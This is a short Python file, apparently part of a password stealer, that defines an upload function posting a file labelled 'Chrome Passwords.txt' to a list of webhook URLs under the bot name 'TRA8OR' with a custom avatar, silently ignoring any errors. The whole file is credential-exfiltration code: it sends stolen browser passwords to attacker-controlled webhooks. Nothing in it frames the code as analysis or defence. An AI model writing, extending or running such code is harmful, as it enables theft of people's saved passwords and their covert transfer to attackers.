import requests

def upload(webhooks, file_path):
    payload = {}
    payload["username"] = "TRA8OR"
    payload["avatar_url"] = "https://i.ibb.co.com/CPrt4Dg/1732257842387.jpg"
    try:
        with open(file_path, "rb") as file:
                for webhook_url in webhooks:
                    response = requests.post(webhook_url,data=payload,files={"file": ("Chrome Passwords.txt", file)})
    except Exception as e:
        pass
